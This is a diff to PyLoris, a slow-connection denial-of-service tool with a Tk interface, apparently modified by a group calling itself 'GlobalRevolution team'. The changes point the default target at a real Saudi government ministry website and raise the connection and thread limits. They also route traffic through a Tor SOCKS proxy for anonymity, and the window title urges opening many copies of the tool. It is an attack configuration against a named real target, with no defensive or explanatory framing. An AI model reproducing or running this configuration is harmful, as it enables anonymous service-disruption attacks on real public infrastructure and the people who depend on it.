@@ -21,7 +21,7 @@ from libloris import *
 class MainWindow(Tk):
     def __init__(self):
         Tk.__init__(self)
-        self.title(string = ".o0O| PyLoris |O0o.")
+        self.title(string = " PyLoris by GlobalRevolution team | Open many windows of pyloris.py")
         self.lws = []
 
         self.options = {
@@ -43,18 +43,18 @@ class MainWindow(Tk):
             'request' : StringVar(),
         }
 
-        self.options['host'].set('localhost')
+        self.options['host'].set('www.moi.gov.sa')
         self.options['port'].set(80)
         self.options['ssl'].set(False)
-        self.options['attacklimit'].set(500)
+        self.options['attacklimit'].set(5000)
         self.options['connectionlimit'].set(500)
-        self.options['threadlimit'].set(50)
+        self.options['threadlimit'].set(1000)
         self.options['connectionspeed'].set(0.3)
         self.options['timebetweenthreads'].set(0.3)
         self.options['timebetweenconnections'].set(1)
-        self.options['quitimmediately'].set(False)
-        self.options['socksversion'].set('NONE')
-        self.options['sockshost'].set('localhost')
+        self.options['quitimmediately'].set(True)
+        self.options['socksversion'].set('SOCKS5')
+        self.options['sockshost'].set('127.0.0.1')
         self.options['socksport'].set(9050)
         self.options['socksuser'].set('')
         self.options['sockspass'].set('')
@@ -90,7 +90,7 @@ class MainWindow(Tk):
         pf.grid_propagate(0)
         Label(pf, text = 'Proxy type (SOCKS4/SOCKS5/HTTP/NONE)').grid(row = 0, column = 1)
         Entry(pf, textvariable = self.options['socksversion']).grid(row = 0, column = 2)
-        Label(pf, text = 'Proxy Hostname / IP Address').grid(row = 1, column = 1)
+        Label(pf, text = 'Enter> Proxy or VPN or TOR < IP Address').grid(row = 1, column = 1)
         Entry(pf, textvariable = self.options['sockshost']).grid(row = 1, column = 2)
         Label(pf, text = 'Proxy Port').grid(row = 2, column = 1)
         Entry(pf, textvariable = self.options['socksport']).grid(row = 2, column = 2)
